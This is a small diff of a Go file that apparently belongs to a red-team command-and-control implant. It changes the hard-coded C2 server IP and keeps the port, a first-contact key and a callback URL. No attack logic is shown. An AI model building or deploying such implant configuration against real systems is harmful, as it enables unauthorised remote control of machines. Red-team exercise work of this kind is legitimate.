@@ -21,7 +21,7 @@ import (
 )
 
 // Global Variable Declaration
-var SERVERIP string = "192.168.204.128"
+var SERVERIP string = "192.168.172.147"
 var PORT string = "5000"
 var FIRSTCONTACTKEY string = "dudeOurRedteamalreadyhaslike30C2already-Friend"
 var URL string = "http://" + SERVERIP + ":" + PORT
